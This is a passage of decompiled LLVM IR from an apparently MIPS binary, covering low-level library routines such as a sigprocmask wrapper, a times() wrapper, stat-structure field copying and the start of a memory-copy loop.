  br i1 %v1_407a8c, label %dec_label_pc_407a9c, label %dec_label_pc_407a94

dec_label_pc_407a94:                              ; preds = %dec_label_pc_407a78, %dec_label_pc_407a54
  br label %dec_label_pc_407a98

dec_label_pc_407a98:                              ; preds = %dec_label_pc_407a74, %dec_label_pc_407a94
  %v0_407a98 = phi i32 [ %v0_407a7c, %dec_label_pc_407a74 ], [ -1, %dec_label_pc_407a94 ]
  store i32 %v0_407a98, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407a9c

dec_label_pc_407a9c:                              ; preds = %dec_label_pc_407a78, %dec_label_pc_407a98
  %v4_407aa8 = phi i32 [ %v0_407a7c, %dec_label_pc_407a78 ], [ %v0_407a98, %dec_label_pc_407a98 ]
  ret i32 %v4_407aa8

; uselistorder directives
  uselistorder i32 %v0_407a7c, { 1, 2, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* null, { 1, 0, 2, 8, 9, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_407a9c, { 1, 0 }
  uselistorder label %dec_label_pc_407a98, { 1, 0 }
  uselistorder label %dec_label_pc_407a74, { 1, 0 }
}

define i32 @function_407ab0(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407ab0:
  %a0.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v2_407ad0 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_407ad0, label %dec_label_pc_407b00, label %dec_label_pc_407ad4

dec_label_pc_407ad4:                              ; preds = %dec_label_pc_407ab0
  %v1_407acc = add i32 %arg1, -1
  %v4_407ad0 = icmp ult i32 %v1_407acc, 3
  %v3_407ad8 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407ad8, i32* @t9, align 4
  %v1_407adc = icmp eq i1 %v4_407ad0, false
  store i32 16, i32* %a3.global-to-local, align 4
  br i1 %v1_407adc, label %dec_label_pc_407ae0, label %dec_label_pc_407b04

dec_label_pc_407ae0:                              ; preds = %dec_label_pc_407ad4
  %v1_407ae4 = call i32 @function_4056e0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407afc = inttoptr i32 %v1_407ae4 to i32*
  store i32 22, i32* %v2_407afc, align 4
  %v0_407b08.pre.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407b00

dec_label_pc_407b00:                              ; preds = %dec_label_pc_407ab0, %dec_label_pc_407ae0
  %v0_407b08.pre = phi i32 [ %arg1, %dec_label_pc_407ab0 ], [ %v0_407b08.pre.pre, %dec_label_pc_407ae0 ]
  store i32 16, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407b04

dec_label_pc_407b04:                              ; preds = %dec_label_pc_407ad4, %dec_label_pc_407b00
  %v0_407b08 = phi i32 [ %arg1, %dec_label_pc_407ad4 ], [ %v0_407b08.pre, %dec_label_pc_407b00 ]
  %v7_407b08 = call i32 @sigprocmask(i32 %v0_407b08, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  %v3_407b0c = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407b0c, i32* @t9, align 4
  store i32 %v7_407b08, i32* %s0.global-to-local, align 4
  %v0_407b14 = load i32, i32* %a3.global-to-local, align 4
  %v1_407b14 = icmp eq i32 %v0_407b14, 0
  store i32 %v7_407b08, i32* %a0.global-to-local, align 4
  br i1 %v1_407b14, label %dec_label_pc_407b30, label %dec_label_pc_407b18

dec_label_pc_407b18:                              ; preds = %dec_label_pc_407b04
  %v1_407b1c = call i32 @function_4056e0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_407b2c = load i32, i32* %s0.global-to-local, align 4
  %v2_407b2c = inttoptr i32 %v1_407b1c to i32*
  store i32 %v0_407b2c, i32* %v2_407b2c, align 4
  %v0_407b38.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407b30

dec_label_pc_407b30:                              ; preds = %dec_label_pc_407b04, %dec_label_pc_407b18
  %v0_407b38 = phi i32 [ %v7_407b08, %dec_label_pc_407b04 ], [ %v0_407b38.pre, %dec_label_pc_407b18 ]
  ret i32 %v0_407b38

; uselistorder directives
  uselistorder i32* %a3.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 22, { 1, 2, 16, 3, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 9, 22, 10, 23, 11, 24, 12, 25, 13, 26, 14, 27, 15, 28, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_407b30, { 1, 0 }
  uselistorder label %dec_label_pc_407b04, { 1, 0 }
  uselistorder label %dec_label_pc_407b00, { 1, 0 }
}

define i32 @function_407b50(%tms* %arg1) local_unnamed_addr {
dec_label_pc_407b50:
  %s0.global-to-local = alloca i32, align 4
  %v3_407b70 = call i32 @times(%tms* %arg1)
  %v3_407b74 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_407b74, i32* @t9, align 4
  %v0_407b78 = load i32, i32* @a3, align 4
  %v1_407b78 = icmp eq i32 %v0_407b78, 0
  store i32 %v3_407b70, i32* %s0.global-to-local, align 4
  br i1 %v1_407b78, label %dec_label_pc_407b94, label %dec_label_pc_407b7c

dec_label_pc_407b7c:                              ; preds = %dec_label_pc_407b50
  %v1_407b80 = call i32 @function_4056e0()
  %v0_407b8c = load i32, i32* %s0.global-to-local, align 4
  %v2_407b8c = inttoptr i32 %v1_407b80 to i32*
  store i32 %v0_407b8c, i32* %v2_407b8c, align 4
  br label %dec_label_pc_407b94

dec_label_pc_407b94:                              ; preds = %dec_label_pc_407b50, %dec_label_pc_407b7c
  %v4_407b9c = phi i32 [ %v3_407b70, %dec_label_pc_407b50 ], [ -1, %dec_label_pc_407b7c ]
  ret i32 %v4_407b9c

; uselistorder directives
  uselistorder label %dec_label_pc_407b94, { 1, 0 }
}

define i32 @function_407bb0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407bb0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407be4 = inttoptr i32 %arg2 to i32*
  %v5_407be4 = call i32 @function_405770(i32* %v4_407be4, i32 0, i32 160)
  store i32 %v5_407be4, i32* %v0.global-to-local, align 4
  %v2_407bec = load i32, i32* %arg1, align 4
  store i32 %v2_407bec, i32* %v0.global-to-local, align 4
  %v0_407bf4 = load i32, i32* %s0.global-to-local, align 4
  %v1_407bf4 = inttoptr i32 %v0_407bf4 to i32*
  store i32 0, i32* %v1_407bf4, align 4
  %v0_407bf8 = load i32, i32* %v0.global-to-local, align 4
  %v1_407bf8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407bf8 = add i32 %v1_407bf8, 4
  %v3_407bf8 = inttoptr i32 %v2_407bf8 to i32*
  store i32 %v0_407bf8, i32* %v3_407bf8, align 4
  %v0_407bfc = load i32, i32* %s1.global-to-local, align 4
  %v1_407bfc = add i32 %v0_407bfc, 20
  %v2_407bfc = inttoptr i32 %v1_407bfc to i32*
  %v3_407bfc = load i32, i32* %v2_407bfc, align 4
  store i32 %v3_407bfc, i32* %v1.global-to-local, align 4
  %v1_407c00 = add i32 %v0_407bfc, 16
  %v2_407c00 = inttoptr i32 %v1_407c00 to i32*
  %v3_407c00 = load i32, i32* %v2_407c00, align 4
  store i32 %v3_407c00, i32* %v0.global-to-local, align 4
  %v1_407c04 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c04 = add i32 %v1_407c04, 20
  %v3_407c04 = inttoptr i32 %v2_407c04 to i32*
  store i32 %v3_407bfc, i32* %v3_407c04, align 4
  %v0_407c08 = load i32, i32* %v0.global-to-local, align 4
  %v1_407c08 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c08 = add i32 %v1_407c08, 16
  %v3_407c08 = inttoptr i32 %v2_407c08 to i32*
  store i32 %v0_407c08, i32* %v3_407c08, align 4
  %v0_407c0c = load i32, i32* %s1.global-to-local, align 4
  %v1_407c0c = add i32 %v0_407c0c, 24
  %v2_407c0c = inttoptr i32 %v1_407c0c to i32*
  %v3_407c0c = load i32, i32* %v2_407c0c, align 4
  store i32 %v3_407c0c, i32* %v0.global-to-local, align 4
  %v1_407c14 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c14 = add i32 %v1_407c14, 24
  %v3_407c14 = inttoptr i32 %v2_407c14 to i32*
  store i32 %v3_407c0c, i32* %v3_407c14, align 4
  %v0_407c18 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c18 = add i32 %v0_407c18, 28
  %v2_407c18 = inttoptr i32 %v1_407c18 to i32*
  %v3_407c18 = load i32, i32* %v2_407c18, align 4
  store i32 %v3_407c18, i32* %v0.global-to-local, align 4
  %v1_407c20 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c20 = add i32 %v1_407c20, 28
  %v3_407c20 = inttoptr i32 %v2_407c20 to i32*
  store i32 %v3_407c18, i32* %v3_407c20, align 4
  %v0_407c24 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c24 = add i32 %v0_407c24, 32
  %v2_407c24 = inttoptr i32 %v1_407c24 to i32*
  %v3_407c24 = load i32, i32* %v2_407c24, align 4
  store i32 %v3_407c24, i32* %v0.global-to-local, align 4
  %v1_407c2c = load i32, i32* %s0.global-to-local, align 4
  %v2_407c2c = add i32 %v1_407c2c, 32
  %v3_407c2c = inttoptr i32 %v2_407c2c to i32*
  store i32 %v3_407c24, i32* %v3_407c2c, align 4
  %v0_407c30 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c30 = add i32 %v0_407c30, 36
  %v2_407c30 = inttoptr i32 %v1_407c30 to i32*
  %v3_407c30 = load i32, i32* %v2_407c30, align 4
  store i32 %v3_407c30, i32* %v0.global-to-local, align 4
  %v1_407c38 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c38 = add i32 %v1_407c38, 36
  %v3_407c38 = inttoptr i32 %v2_407c38 to i32*
  store i32 %v3_407c30, i32* %v3_407c38, align 4
  %v0_407c3c = load i32, i32* %s1.global-to-local, align 4
  %v1_407c3c = add i32 %v0_407c3c, 40
  %v2_407c3c = inttoptr i32 %v1_407c3c to i32*
  %v3_407c3c = load i32, i32* %v2_407c3c, align 4
  store i32 %v3_407c3c, i32* %v0.global-to-local, align 4
  %v0_407c40 = load i32, i32* %s0.global-to-local, align 4
  %v1_407c40 = add i32 %v0_407c40, 40
  %v2_407c40 = inttoptr i32 %v1_407c40 to i32*
  store i32 0, i32* %v2_407c40, align 4
  %v0_407c44 = load i32, i32* %v0.global-to-local, align 4
  %v1_407c44 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c44 = add i32 %v1_407c44, 44
  %v3_407c44 = inttoptr i32 %v2_407c44 to i32*
  store i32 %v0_407c44, i32* %v3_407c44, align 4
  %v0_407c48 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c48 = add i32 %v0_407c48, 60
  %v2_407c48 = inttoptr i32 %v1_407c48 to i32*
  %v3_407c48 = load i32, i32* %v2_407c48, align 4
  store i32 %v3_407c48, i32* %v1.global-to-local, align 4
  %v1_407c4c = add i32 %v0_407c48, 56
  %v2_407c4c = inttoptr i32 %v1_407c4c to i32*
  %v3_407c4c = load i32, i32* %v2_407c4c, align 4
  store i32 %v3_407c4c, i32* %v0.global-to-local, align 4
  %v1_407c50 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c50 = add i32 %v1_407c50, 60
  %v3_407c50 = inttoptr i32 %v2_407c50 to i32*
  store i32 %v3_407c48, i32* %v3_407c50, align 4
  %v0_407c54 = load i32, i32* %v0.global-to-local, align 4
  %v1_407c54 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c54 = add i32 %v1_407c54, 56
  %v3_407c54 = inttoptr i32 %v2_407c54 to i32*
  store i32 %v0_407c54, i32* %v3_407c54, align 4
  %v0_407c58 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c58 = add i32 %v0_407c58, 88
  %v2_407c58 = inttoptr i32 %v1_407c58 to i32*
  %v3_407c58 = load i32, i32* %v2_407c58, align 4
  store i32 %v3_407c58, i32* %v0.global-to-local, align 4
  %v1_407c60 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c60 = add i32 %v1_407c60, 88
  %v3_407c60 = inttoptr i32 %v2_407c60 to i32*
  store i32 %v3_407c58, i32* %v3_407c60, align 4
  %v0_407c64 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c64 = add i32 %v0_407c64, 96
  %v2_407c64 = inttoptr i32 %v1_407c64 to i32*
  %v3_407c64 = load i32, i32* %v2_407c64, align 4
  store i32 %v3_407c64, i32* %v0.global-to-local, align 4
  %v1_407c68 = add i32 %v0_407c64, 100
  %v2_407c68 = inttoptr i32 %v1_407c68 to i32*
  %v3_407c68 = load i32, i32* %v2_407c68, align 4
  store i32 %v3_407c68, i32* %v1.global-to-local, align 4
  %v1_407c6c = load i32, i32* %s0.global-to-local, align 4
  %v2_407c6c = add i32 %v1_407c6c, 96
  %v3_407c6c = inttoptr i32 %v2_407c6c to i32*
  store i32 %v3_407c64, i32* %v3_407c6c, align 4
  %v0_407c70 = load i32, i32* %v1.global-to-local, align 4
  %v1_407c70 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c70 = add i32 %v1_407c70, 100
  %v3_407c70 = inttoptr i32 %v2_407c70 to i32*
  store i32 %v0_407c70, i32* %v3_407c70, align 4
  %v0_407c74 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c74 = add i32 %v0_407c74, 64
  %v2_407c74 = inttoptr i32 %v1_407c74 to i32*
  %v3_407c74 = load i32, i32* %v2_407c74, align 4
  store i32 %v3_407c74, i32* %v0.global-to-local, align 4
  %v1_407c7c = load i32, i32* %s0.global-to-local, align 4
  %v2_407c7c = add i32 %v1_407c7c, 64
  %v3_407c7c = inttoptr i32 %v2_407c7c to i32*
  store i32 %v3_407c74, i32* %v3_407c7c, align 4
  %v0_407c80 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c80 = add i32 %v0_407c80, 72
  %v2_407c80 = inttoptr i32 %v1_407c80 to i32*
  %v3_407c80 = load i32, i32* %v2_407c80, align 4
  store i32 %v3_407c80, i32* %v0.global-to-local, align 4
  %v1_407c88 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c88 = add i32 %v1_407c88, 72
  %v3_407c88 = inttoptr i32 %v2_407c88 to i32*
  store i32 %v3_407c80, i32* %v3_407c88, align 4
  %v0_407c8c = load i32, i32* %s1.global-to-local, align 4
  %v1_407c8c = add i32 %v0_407c8c, 80
  %v2_407c8c = inttoptr i32 %v1_407c8c to i32*
  %v3_407c8c = load i32, i32* %v2_407c8c, align 4
  store i32 %v3_407c8c, i32* %v0.global-to-local, align 4
  %v1_407c94 = load i32, i32* %s0.global-to-local, align 4
  %v2_407c94 = add i32 %v1_407c94, 80
  %v3_407c94 = inttoptr i32 %v2_407c94 to i32*
  store i32 %v3_407c8c, i32* %v3_407c94, align 4
  %v0_407c98 = load i32, i32* %s1.global-to-local, align 4
  %v1_407c98 = add i32 %v0_407c98, 68
  %v2_407c98 = inttoptr i32 %v1_407c98 to i32*
  %v3_407c98 = load i32, i32* %v2_407c98, align 4
  store i32 %v3_407c98, i32* %v0.global-to-local, align 4
  %v1_407ca0 = load i32, i32* %s0.global-to-local, align 4
  %v2_407ca0 = add i32 %v1_407ca0, 68
  %v3_407ca0 = inttoptr i32 %v2_407ca0 to i32*
  store i32 %v3_407c98, i32* %v3_407ca0, align 4
  %v0_407ca4 = load i32, i32* %s1.global-to-local, align 4
  %v1_407ca4 = add i32 %v0_407ca4, 76
  %v2_407ca4 = inttoptr i32 %v1_407ca4 to i32*
  %v3_407ca4 = load i32, i32* %v2_407ca4, align 4
  store i32 %v3_407ca4, i32* %v0.global-to-local, align 4
  %v1_407cac = load i32, i32* %s0.global-to-local, align 4
  %v2_407cac = add i32 %v1_407cac, 76
  %v3_407cac = inttoptr i32 %v2_407cac to i32*
  store i32 %v3_407ca4, i32* %v3_407cac, align 4
  %v0_407cb0 = load i32, i32* %s1.global-to-local, align 4
  %v1_407cb0 = add i32 %v0_407cb0, 84
  %v2_407cb0 = inttoptr i32 %v1_407cb0 to i32*
  %v3_407cb0 = load i32, i32* %v2_407cb0, align 4
  store i32 %v3_407cb0, i32* %v0.global-to-local, align 4
  %v1_407cb8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407cb8 = add i32 %v1_407cb8, 84
  %v3_407cb8 = inttoptr i32 %v2_407cb8 to i32*
  store i32 %v3_407cb0, i32* %v3_407cb8, align 4
  ret i32 %v3_407cb0

; uselistorder directives
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 20, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32 100, { 2, 3, 1, 0, 4 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407cd0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407cd0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407d04 = inttoptr i32 %arg2 to i32*
  %v5_407d04 = call i32 @function_405770(i32* %v4_407d04, i32 0, i32 152)
  store i32 %v5_407d04, i32* %v0.global-to-local, align 4
  %v2_407d0c = load i32, i32* %arg1, align 4
  store i32 %v2_407d0c, i32* %v0.global-to-local, align 4
  %v0_407d14 = load i32, i32* %s0.global-to-local, align 4
  %v1_407d14 = inttoptr i32 %v0_407d14 to i32*
  store i32 0, i32* %v1_407d14, align 4
  %v0_407d18 = load i32, i32* %v0.global-to-local, align 4
  %v1_407d18 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d18 = add i32 %v1_407d18, 4
  %v3_407d18 = inttoptr i32 %v2_407d18 to i32*
  store i32 %v0_407d18, i32* %v3_407d18, align 4
  %v0_407d1c = load i32, i32* %s1.global-to-local, align 4
  %v1_407d1c = add i32 %v0_407d1c, 16
  %v2_407d1c = inttoptr i32 %v1_407d1c to i32*
  %v3_407d1c = load i32, i32* %v2_407d1c, align 4
  store i32 %v3_407d1c, i32* %v0.global-to-local, align 4
  %v1_407d24 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d24 = add i32 %v1_407d24, 16
  %v3_407d24 = inttoptr i32 %v2_407d24 to i32*
  store i32 %v3_407d1c, i32* %v3_407d24, align 4
  %v0_407d28 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d28 = add i32 %v0_407d28, 20
  %v2_407d28 = inttoptr i32 %v1_407d28 to i32*
  %v3_407d28 = load i32, i32* %v2_407d28, align 4
  store i32 %v3_407d28, i32* %v0.global-to-local, align 4
  %v1_407d30 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d30 = add i32 %v1_407d30, 20
  %v3_407d30 = inttoptr i32 %v2_407d30 to i32*
  store i32 %v3_407d28, i32* %v3_407d30, align 4
  %v0_407d34 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d34 = add i32 %v0_407d34, 24
  %v2_407d34 = inttoptr i32 %v1_407d34 to i32*
  %v3_407d34 = load i32, i32* %v2_407d34, align 4
  store i32 %v3_407d34, i32* %v0.global-to-local, align 4
  %v1_407d3c = load i32, i32* %s0.global-to-local, align 4
  %v2_407d3c = add i32 %v1_407d3c, 24
  %v3_407d3c = inttoptr i32 %v2_407d3c to i32*
  store i32 %v3_407d34, i32* %v3_407d3c, align 4
  %v0_407d40 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d40 = add i32 %v0_407d40, 28
  %v2_407d40 = inttoptr i32 %v1_407d40 to i32*
  %v3_407d40 = load i32, i32* %v2_407d40, align 4
  store i32 %v3_407d40, i32* %v0.global-to-local, align 4
  %v1_407d48 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d48 = add i32 %v1_407d48, 28
  %v3_407d48 = inttoptr i32 %v2_407d48 to i32*
  store i32 %v3_407d40, i32* %v3_407d48, align 4
  %v0_407d4c = load i32, i32* %s1.global-to-local, align 4
  %v1_407d4c = add i32 %v0_407d4c, 32
  %v2_407d4c = inttoptr i32 %v1_407d4c to i32*
  %v3_407d4c = load i32, i32* %v2_407d4c, align 4
  store i32 %v3_407d4c, i32* %v0.global-to-local, align 4
  %v1_407d54 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d54 = add i32 %v1_407d54, 32
  %v3_407d54 = inttoptr i32 %v2_407d54 to i32*
  store i32 %v3_407d4c, i32* %v3_407d54, align 4
  %v0_407d58 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d58 = add i32 %v0_407d58, 36
  %v2_407d58 = inttoptr i32 %v1_407d58 to i32*
  %v3_407d58 = load i32, i32* %v2_407d58, align 4
  store i32 %v3_407d58, i32* %v0.global-to-local, align 4
  %v0_407d5c = load i32, i32* %s0.global-to-local, align 4
  %v1_407d5c = add i32 %v0_407d5c, 40
  %v2_407d5c = inttoptr i32 %v1_407d5c to i32*
  store i32 0, i32* %v2_407d5c, align 4
  %v0_407d60 = load i32, i32* %v0.global-to-local, align 4
  %v1_407d60 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d60 = add i32 %v1_407d60, 44
  %v3_407d60 = inttoptr i32 %v2_407d60 to i32*
  store i32 %v0_407d60, i32* %v3_407d60, align 4
  %v0_407d64 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d64 = add i32 %v0_407d64, 48
  %v2_407d64 = inttoptr i32 %v1_407d64 to i32*
  %v3_407d64 = load i32, i32* %v2_407d64, align 4
  store i32 %v3_407d64, i32* %v0.global-to-local, align 4
  %v1_407d6c = load i32, i32* %s0.global-to-local, align 4
  %v2_407d6c = add i32 %v1_407d6c, 52
  %v3_407d6c = inttoptr i32 %v2_407d6c to i32*
  store i32 %v3_407d64, i32* %v3_407d6c, align 4
  %v0_407d70 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d70 = add i32 %v0_407d70, 80
  %v2_407d70 = inttoptr i32 %v1_407d70 to i32*
  %v3_407d70 = load i32, i32* %v2_407d70, align 4
  store i32 %v3_407d70, i32* %v0.global-to-local, align 4
  %v1_407d78 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d78 = add i32 %v1_407d78, 84
  %v3_407d78 = inttoptr i32 %v2_407d78 to i32*
  store i32 %v3_407d70, i32* %v3_407d78, align 4
  %v0_407d7c = load i32, i32* %s1.global-to-local, align 4
  %v1_407d7c = add i32 %v0_407d7c, 84
  %v2_407d7c = inttoptr i32 %v1_407d7c to i32*
  %v3_407d7c = load i32, i32* %v2_407d7c, align 4
  store i32 %v3_407d7c, i32* %v0.global-to-local, align 4
  %v1_407d84 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d84 = add i32 %v1_407d84, 88
  %v3_407d84 = inttoptr i32 %v2_407d84 to i32*
  store i32 %v3_407d7c, i32* %v3_407d84, align 4
  %v0_407d88 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d88 = add i32 %v0_407d88, 56
  %v2_407d88 = inttoptr i32 %v1_407d88 to i32*
  %v3_407d88 = load i32, i32* %v2_407d88, align 4
  store i32 %v3_407d88, i32* %v0.global-to-local, align 4
  %v1_407d90 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d90 = add i32 %v1_407d90, 60
  %v3_407d90 = inttoptr i32 %v2_407d90 to i32*
  store i32 %v3_407d88, i32* %v3_407d90, align 4
  %v0_407d94 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d94 = add i32 %v0_407d94, 64
  %v2_407d94 = inttoptr i32 %v1_407d94 to i32*
  %v3_407d94 = load i32, i32* %v2_407d94, align 4
  store i32 %v3_407d94, i32* %v0.global-to-local, align 4
  %v1_407d9c = load i32, i32* %s0.global-to-local, align 4
  %v2_407d9c = add i32 %v1_407d9c, 68
  %v3_407d9c = inttoptr i32 %v2_407d9c to i32*
  store i32 %v3_407d94, i32* %v3_407d9c, align 4
  %v0_407da0 = load i32, i32* %s1.global-to-local, align 4
  %v1_407da0 = add i32 %v0_407da0, 72
  %v2_407da0 = inttoptr i32 %v1_407da0 to i32*
  %v3_407da0 = load i32, i32* %v2_407da0, align 4
  store i32 %v3_407da0, i32* %v0.global-to-local, align 4
  %v1_407da8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407da8 = add i32 %v1_407da8, 76
  %v3_407da8 = inttoptr i32 %v2_407da8 to i32*
  store i32 %v3_407da0, i32* %v3_407da8, align 4
  %v0_407dac = load i32, i32* %s1.global-to-local, align 4
  %v1_407dac = add i32 %v0_407dac, 60
  %v2_407dac = inttoptr i32 %v1_407dac to i32*
  %v3_407dac = load i32, i32* %v2_407dac, align 4
  store i32 %v3_407dac, i32* %v0.global-to-local, align 4
  %v1_407db4 = load i32, i32* %s0.global-to-local, align 4
  %v2_407db4 = add i32 %v1_407db4, 64
  %v3_407db4 = inttoptr i32 %v2_407db4 to i32*
  store i32 %v3_407dac, i32* %v3_407db4, align 4
  %v0_407db8 = load i32, i32* %s1.global-to-local, align 4
  %v1_407db8 = add i32 %v0_407db8, 68
  %v2_407db8 = inttoptr i32 %v1_407db8 to i32*
  %v3_407db8 = load i32, i32* %v2_407db8, align 4
  store i32 %v3_407db8, i32* %v0.global-to-local, align 4
  %v1_407dc0 = load i32, i32* %s0.global-to-local, align 4
  %v2_407dc0 = add i32 %v1_407dc0, 72
  %v3_407dc0 = inttoptr i32 %v2_407dc0 to i32*
  store i32 %v3_407db8, i32* %v3_407dc0, align 4
  %v0_407dc4 = load i32, i32* %s1.global-to-local, align 4
  %v1_407dc4 = add i32 %v0_407dc4, 76
  %v2_407dc4 = inttoptr i32 %v1_407dc4 to i32*
  %v3_407dc4 = load i32, i32* %v2_407dc4, align 4
  store i32 %v3_407dc4, i32* %v0.global-to-local, align 4
  %v1_407dcc = load i32, i32* %s0.global-to-local, align 4
  %v2_407dcc = add i32 %v1_407dcc, 80
  %v3_407dcc = inttoptr i32 %v2_407dcc to i32*
  store i32 %v3_407dc4, i32* %v3_407dcc, align 4
  ret i32 %v3_407dc4

; uselistorder directives
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 9, 10, 11, 12, 13, 15 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 88, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 84, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 52, { 1, 0 }
  uselistorder i32 48, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407df0() local_unnamed_addr {
dec_label_pc_407df0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %t6.global-to-local = alloca i32, align 4
  %t7.global-to-local = alloca i32, align 4
  %v0_407df0 = load i32, i32* @a2, align 4
  %v1_407df0 = icmp slt i32 %v0_407df0, 8
  %v2_407df0 = zext i1 %v1_407df0 to i32
  store i32 %v2_407df0, i32* %t0.global-to-local, align 4
  %v2_407df4 = load i32, i32* @a0, align 4
  br i1 %v1_407df0, label %dec_label_pc_407eb0, label %dec_label_pc_407df8

dec_label_pc_407df8:                              ; preds = %dec_label_pc_407df0
  %v0_407dfc = load i32, i32* @a1, align 4
  %v2_407dfc = xor i32 %v0_407dfc, %v2_407df4
  %v1_407e00 = urem i32 %v2_407dfc, 4
  store i32 %v1_407e00, i32* %t0.global-to-local, align 4
  %v1_407e04 = icmp eq i32 %v1_407e00, 0
  %v3_407e04 = sub i32 0, %v0_407dfc
  store i32 %v3_407e04, i32* %t1.global-to-local, align 4
  br i1 %v1_407e04, label %dec_label_pc_407e08, label %dec_label_pc_407ed4

dec_label_pc_407e08:                              ; preds = %dec_label_pc_407df8
  %v1_407e0c = urem i32 %v3_407e04, 4
  store i32 %v1_407e0c, i32* %t1.global-to-local, align 4
  %v1_407e10 = icmp eq i32 %v1_407e0c, 0
  %v4_407e10 = sub i32 %v0_407df0, %v1_407e0c
  store i32 %v4_407e10, i32* %a2.global-to-local, align 4
  br i1 %v1_407e10, label %dec_label_pc_407e28, label %dec_label_pc_407e14

dec_label_pc_407e14:                              ; preds = %dec_label_pc_407e08
  %v2_407e1c = add i32 %v1_407e0c, %v0_407dfc
  store i32 %v2_407e1c, i32* @a1, align 4
  %v2_407e24 = add i32 %v1_407e0c, %v2_407df4
  store i32 %v2_407e24, i32* @a0, align 4
  br label %dec_label_pc_407e28

dec_label_pc_407e28:                              ; preds = %dec_label_pc_407e08, %dec_label_pc_407e14
